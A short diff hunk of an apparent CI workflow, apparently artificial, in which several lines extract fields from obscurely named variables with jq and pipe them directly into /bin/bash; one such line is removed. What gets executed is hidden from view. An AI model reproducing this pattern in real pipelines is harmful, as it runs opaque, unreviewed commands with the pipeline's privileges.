@@ -24,7 +24,6 @@ jobs:
           echo $kz08 | jq -r .k9 | /bin/bash
           printf '%s' "$t74854" | jq -r .iiah3310 | /bin/bash
           echo $muon59750 | jq -r .ebua63 | /bin/bash
-          echo $b1579 | jq -r .mj32 | /bin/bash
           printf '%s' "$h7" | jq -r .ddncg955 | /bin/bash
           printf '%s' "$bxce150" | jq -r .qbp121 | /bin/bash
 
